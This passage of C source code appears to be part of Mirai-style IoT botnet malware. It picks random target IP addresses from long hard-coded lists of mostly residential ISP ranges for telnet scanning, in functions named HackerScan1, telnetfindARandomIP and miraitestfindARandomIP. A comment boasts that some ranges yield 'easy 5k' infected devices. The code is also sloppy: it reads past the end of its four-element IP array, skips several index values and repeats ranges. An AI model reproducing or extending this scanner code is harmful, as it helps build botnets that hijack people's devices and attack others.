szprintf(ip, "210.213.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 16)
{
szprintf(ip, "59.69.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 17)
{
szprintf(ip, "122.52.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 18)
{
szprintf(ip, "122.54.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 19)
{
szprintf(ip, "119.93.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 20)
{
szprintf(ip, "124.105.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 21)
{
szprintf(ip, "125.104.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 22)
{
szprintf(ip, "119.92.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 23)
{
szprintf(ip, "119.91.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 24)
{
szprintf(ip, "49.144.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 25)
{
szprintf(ip, "103.20.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 26)
{
szprintf(ip, "103.30.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 27)
{
szprintf(ip, "103.47.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 28)
{
szprintf(ip, "103.57.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 29)
{
szprintf(ip, "12.188.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 30)
{
szprintf(ip, "12.34.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 31)
{
szprintf(ip, "179.105.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 32)
{
szprintf(ip, "179.152.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 33)
{
szprintf(ip, "189.29.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 34)
{
szprintf(ip, "189.32.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 35)
{
szprintf(ip, "189.33.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 36)
{
szprintf(ip, "189.34.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 37)
{
szprintf(ip, "189.35.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 38)
{
szprintf(ip, "189.39.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 39)
{
szprintf(ip, "189.4.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 40)
{
szprintf(ip, "189.54.%d.%d", ipState[2], ipState[3]);
}
return inet_addr(ip);
}

in_addr_t HackerScan1(){

ipState[0] = 0;
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[0] = rand() % 223;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
int randnum = rand() % 290;
char ip[16];
if(randnum == 0)
{
szprintf(ip, "112.5.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 1)
{
szprintf(ip, "117.165.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 2)
{
szprintf(ip, "85.3.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 3)
{
szprintf(ip, "41.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 4)
{
szprintf(ip, "104.55.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 5)
{
szprintf(ip, "78.186.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 6)
{
szprintf(ip, "78.189.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 7)
{
szprintf(ip, "221.120.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 8)
{
szprintf(ip, "88.5.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 9)
{
szprintf(ip, "41.254.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 10)
{
szprintf(ip, "103.20.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 11)
{
szprintf(ip, "103.47.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 12)
{
szprintf(ip, "103.57.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 13)
{
szprintf(ip, "45.117.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 14)
{
szprintf(ip, "101.51.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 15)
{
szprintf(ip, "137.59.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 16)
{
szprintf(ip, "14.204.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 17)
{
szprintf(ip, "27.50.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 18)
{
szprintf(ip, "27.54.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 19)
{
szprintf(ip, "27.98.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 20)
{
szprintf(ip, "36.32.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 21)
{
szprintf(ip, "36.248.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 22)
{
szprintf(ip, "39.64.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 23)
{
szprintf(ip, "43.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 24)
{
szprintf(ip, "43.230.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 25)
{
szprintf(ip, "163.53.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 26)
{
szprintf(ip, "43.230.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 27)
{
szprintf(ip, "43.245.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 28)
{
szprintf(ip, "123.25.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 29)
{
szprintf(ip, "103.54.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 30)
{
szprintf(ip, "27.255.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 31)
{
szprintf(ip, "103.204.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 32)
{
szprintf(ip, "123.24.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 33)
{
szprintf(ip, "113.191.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 34)
{
szprintf(ip, "113.188.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 34)
{
szprintf(ip, "113.189.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 35)
{
szprintf(ip, "14.160.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 36)
{
szprintf(ip, "14.161.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 37)
{
szprintf(ip, "14.162.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 38)
{
szprintf(ip, "14.163.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 39)
{
szprintf(ip, "14.164.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 40)
{
szprintf(ip, "14.165.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 41)
{
szprintf(ip, "14.166.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 42)
{
szprintf(ip, "14.167.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 43)
{
szprintf(ip, "14.168.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 44)
{
szprintf(ip, "14.169.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 45)
{
szprintf(ip, "14.170.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 46)
{
szprintf(ip, "14.171.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 47)
{
szprintf(ip, "14.172.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 48)
{
szprintf(ip, "14.173.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 49)
{
szprintf(ip, "14.174.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 50)
{
szprintf(ip, "14.175.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 51)
{
szprintf(ip, "14.176.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 52)
{
szprintf(ip, "14.177.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 53)
{
szprintf(ip, "14.178.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 54)
{
szprintf(ip, "14.179.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 55)
{
szprintf(ip, "14.180.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 56)
{
szprintf(ip, "14.181.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 57)
{
szprintf(ip, "14.182.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 58)
{
szprintf(ip, "14.183.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 59)
{
szprintf(ip, "14.184.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 60)
{
szprintf(ip, "14.185.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 61)
{
szprintf(ip, "14.186.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 62)
{
szprintf(ip, "14.187.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 63)
{
szprintf(ip, "14.188.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 64)
{
szprintf(ip, "14.189.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 65)
{
szprintf(ip, "14.190.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 66)
{
szprintf(ip, "14.191.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 67)
{
szprintf(ip, "45.121.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 68)
{
szprintf(ip, "45.120.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 69)
{
szprintf(ip, "45.115.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 70)
{
szprintf(ip, "43.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 71)
{
szprintf(ip, "43.230.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 72)
{
szprintf(ip, "43.240.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 73)
{
szprintf(ip, "43.245.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 74)
{
szprintf(ip, "41.174.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 75)
{
szprintf(ip, "45.127.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 76)
{
szprintf(ip, "103.30.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 77)
{
szprintf(ip, "123.16.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 78)
{
szprintf(ip, "202.44.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 79)
{
szprintf(ip, "116.93.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 80)
{
szprintf(ip, "41.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 81)
{
szprintf(ip, "117.173.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 82)
{
szprintf(ip, "113.190.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 83)
{
szprintf(ip, "112.196.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 84)
{
szprintf(ip, "113.178.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 85)
{
szprintf(ip, "112.45.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 86)
{
szprintf(ip, "183.223.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 87)
{
szprintf(ip, "116.71.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 88)
{
szprintf(ip, "103.44.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 89)
{
szprintf(ip, "110.235.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 90)
{
szprintf(ip, "124.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 91)
{
szprintf(ip, "211.237.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 92)
{
szprintf(ip, "117.175.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 93)
{
szprintf(ip, "117.173.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 94)
{
szprintf(ip, "111.9.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 95)
{
szprintf(ip, "222.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 96)
{
szprintf(ip, "113.174.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 97)
{
szprintf(ip, "222.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 98)
{
szprintf(ip, "113.160.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 99)
{
szprintf(ip, "113.161.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 100)
{
szprintf(ip, "113.162.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 101)
{
szprintf(ip, "113.163.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 102)
{
szprintf(ip, "113.164.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 103)
{
szprintf(ip, "113.165.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 104)
{
szprintf(ip, "113.166.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 105)
{
szprintf(ip, "113.167.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 106)
{
szprintf(ip, "113.168.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 107)
{
szprintf(ip, "113.169.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 108)
{
szprintf(ip, "123.17.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 109)
{
szprintf(ip, "123.21.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 110)
{
szprintf(ip, "123.22.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 111)
{
szprintf(ip, "222.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 112)
{
szprintf(ip, "222.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 113)
{
szprintf(ip, "222.254.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 114)
{
szprintf(ip, "222.255.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 115)
{
szprintf(ip, "41.208.%d.%d", ipState[2], ipState[3]);
}

if(randnum == 116)
{
szprintf(ip, "103.198.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 117)
{
szprintf(ip, "88.248.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 118)
{
szprintf(ip, "88.105.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 119)
{
szprintf(ip, "88.247.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 120)
{
szprintf(ip, "85.105.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 121)
{
szprintf(ip, "188.3.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 122)
{
szprintf(ip, "103.203.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 123)
{
szprintf(ip, "103.55.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 124)
{
szprintf(ip, "103.220.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 125)
{
szprintf(ip, "183.233.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 126)
{
szprintf(ip, "103.242.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 127)
{
szprintf(ip, "103.198.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 128)
{
szprintf(ip, "103.14.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 129)
{
szprintf(ip, "103.195.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 130)
{
szprintf(ip, "103.203.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 131)
{
szprintf(ip, "103.214.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 132)
{
szprintf(ip, "103.218.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 133)
{
szprintf(ip, "103.225.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 134)
{
szprintf(ip, "103.228.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 135)
{
szprintf(ip, "103.231.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 136)
{
szprintf(ip, "103.60.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 137)
{
szprintf(ip, "103.248.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 138)
{
szprintf(ip, "103.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 139)
{
szprintf(ip, "103.255.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 140)
{
szprintf(ip, "113.176.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 141)
{
szprintf(ip, "113.175.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 142)
{
szprintf(ip, "203.134.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 143)
{
szprintf(ip, "203.210.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 144)
{
szprintf(ip, "117.176.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 145)
{
szprintf(ip, "117.171.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 146)
{
szprintf(ip, "117.162.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 147)
{
szprintf(ip, "203.150.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 148)
{
szprintf(ip, "157.119.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 149)
{
szprintf(ip, "43.228.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 150)
{
szprintf(ip, "162.12.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 151)
{
szprintf(ip, "115.220.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 152)
{
szprintf(ip, "125.114.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 153)
{
szprintf(ip, "112.5.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 154)
{
szprintf(ip, "117.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 155)
{
szprintf(ip, "85.3.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 156)
{
szprintf(ip, "37.158.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 157)
{
szprintf(ip, "95.9.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 158)
{
szprintf(ip, "41.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 159)
{
szprintf(ip, "58.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 160)
{
szprintf(ip, "104.55.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 161)
{
szprintf(ip, "78.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 162)
{
szprintf(ip, "78.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 163)
{
szprintf(ip, "221.120.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 164)
{
szprintf(ip, "88.5.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 165)
{
szprintf(ip, "41.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 166)
{
szprintf(ip, "103.20.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 167)
{
szprintf(ip, "103.47.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 168)
{
szprintf(ip, "103.57.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 169)
{
szprintf(ip, "45.117.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 170)
{
szprintf(ip, "101.51.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 171)
{
szprintf(ip, "137.59.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 172)
{
szprintf(ip, "1.56.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 173)
{
szprintf(ip, "1.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 174)
{
szprintf(ip, "14.204.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 175)
{
szprintf(ip, "27.0.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 176)
{
szprintf(ip, "27.8.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 177)
{
szprintf(ip, "27.50.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 178)
{
szprintf(ip, "27.54.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 179)
{
szprintf(ip, "27.98.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 180)
{
szprintf(ip, "27.112.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 181)
{
szprintf(ip, "27.192.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 182)
{
szprintf(ip, "36.32.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 183)
{
szprintf(ip, "36.248.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 184)
{
szprintf(ip, "39.64.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 185)
{
szprintf(ip, "42.4.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 186)
{
szprintf(ip, "42.48.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 187)
{
szprintf(ip, "42.52.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 188)
{
szprintf(ip, "42.56.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 189)
{
szprintf(ip, "42.63.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 190)
{
szprintf(ip, "42.84.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 191)
{
szprintf(ip, "42.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 192)
{
szprintf(ip, "42.224.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 193)
{
szprintf(ip, "42.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 194)
{
szprintf(ip, "60.0.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 195)
{
szprintf(ip, "60.16.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 196)
{
szprintf(ip, "163.53.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 197)
{
szprintf(ip, "62.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 198)
{
szprintf(ip, "62.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 199)
{
szprintf(ip, "62.254.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 200)
{
szprintf(ip, "62.255.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 201)
{
szprintf(ip, "77.96.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 202)
{
szprintf(ip, "77.97.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 203)
{
szprintf(ip, "77.98.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 204)
{
szprintf(ip, "77.100.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 205)
{
szprintf(ip, "77.102.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 206)
{
szprintf(ip, "113.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 207)
{
szprintf(ip, "81.100.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 208)
{
szprintf(ip, "113.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 209)
{
szprintf(ip, "113.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 210)
{
szprintf(ip, "94.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 211)
{
szprintf(ip, "14.160.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 212)
{
szprintf(ip, "14.161.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 213)
{
szprintf(ip, "14.162.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 214)
{
szprintf(ip, "14.163.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 215)
{
szprintf(ip, "14.164.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 216)
{
szprintf(ip, "14.165.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 217)
{
szprintf(ip, "14.166.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 218)
{
szprintf(ip, "14.167.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 219)
{
szprintf(ip, "14.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 220)
{
szprintf(ip, "14.169.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 221)
{
szprintf(ip, "14.170.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 222)
{
szprintf(ip, "14.171.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 223)
{
szprintf(ip, "14.172.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 224)
{
szprintf(ip, "14.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 225)
{
szprintf(ip, "14.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 226)
{
szprintf(ip, "14.175.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 227)
{
szprintf(ip, "14.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 228)
{
szprintf(ip, "14.177.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 229)
{
szprintf(ip, "14.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 230)
{
szprintf(ip, "14.179.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 231)
{
szprintf(ip, "14.180.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 232)
{
szprintf(ip, "14.181.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 233)
{
szprintf(ip, "14.182.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 234)
{
szprintf(ip, "14.183.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 235)
{
szprintf(ip, "14.184.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 236)
{
szprintf(ip, "14.185.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 237)
{
szprintf(ip, "14.186.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 238)
{
szprintf(ip, "14.187.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 239)
{
szprintf(ip, "14.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 240)
{
szprintf(ip, "14.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 241)
{
szprintf(ip, "14.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 242)
{
szprintf(ip, "14.191.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 243)
{
szprintf(ip, "45.121.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 244)
{
szprintf(ip, "45.120.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 245)
{
szprintf(ip, "45.115.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 256)
{//if you hit these ranges right here then easy 5k
szprintf(ip, "43.252.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 257)
{
szprintf(ip, "43.230.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 258)
{
szprintf(ip, "43.240.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 259)
{
szprintf(ip, "43.245.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 260)
{
szprintf(ip, "41.174.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 261)
{
szprintf(ip, "49.118.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 262)
{
szprintf(ip, "78.188.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 263)
{
szprintf(ip, "45.127.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 264)
{
szprintf(ip, "103.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 265)
{
szprintf(ip, "14.33.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 266)
{
szprintf(ip, "123.16.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 267)
{
szprintf(ip, "202.44.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 268)
{
szprintf(ip, "116.93.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 269)
{
szprintf(ip, "91.83.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 270)
{
szprintf(ip, "41.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 271)
{
szprintf(ip, "117.173.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 272)
{
szprintf(ip, "113.190.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 273)
{
szprintf(ip, "146.88.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 274)
{
szprintf(ip, "112.196.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 275)
{
szprintf(ip, "113.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 276)
{
szprintf(ip, "112.45.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 277)
{
szprintf(ip, "183.223.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 278)
{
szprintf(ip, "116.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 279)
{
szprintf(ip, "183.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 280)
{
szprintf(ip, "192.168.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 281)
{
szprintf(ip, "89.71.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 282)
{
szprintf(ip, "244.77.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 283)
{
szprintf(ip, "179.105.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 284)
{
szprintf(ip, "125.27.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 285)
{
szprintf(ip, "189.29.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 287)
{
szprintf(ip, "103.57.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 288)
{
szprintf(ip, "189.35.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 289)
{
szprintf(ip, "189.4.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 290)
{
szprintf(ip, "101.105.%d.%d", ipState[3], ipState[4]);
}
return inet_addr(ip);
}

int telnettestrange = 1;
in_addr_t telnettestfindARandomIP()
{
if(telnettestrange < 1 || telnettestrange > 2)
{
return getRandomPublicIP();
}
else
{
if(telnettestrange == 1){
return getRandomPublicIP();
}
else if(telnettestrange == 2)
{
return HackerScan1();
}
else
{
return HackerScan1();
}
}
}
int telnetrange = 1;
in_addr_t telnetfindARandomIP()
{
if(telnetrange < 1 || telnetrange > 2)
{
return getRandomPublicIP();
}
else
{
if(telnetrange == 1){
return getRandomPublicIP();
}
else if(telnetrange == 2)
{
return HackerScan1();
}
else
{
return HackerScan1();
}
}
}
int miraitestrange = 1;
in_addr_t miraitestfindARandomIP()
{
if(miraitestrange < 1 || miraitestrange > 2)
{
return getRandomPublicIP();
}
else
{
if(miraitestrange == 1){
return MiraiIPRanges();
}
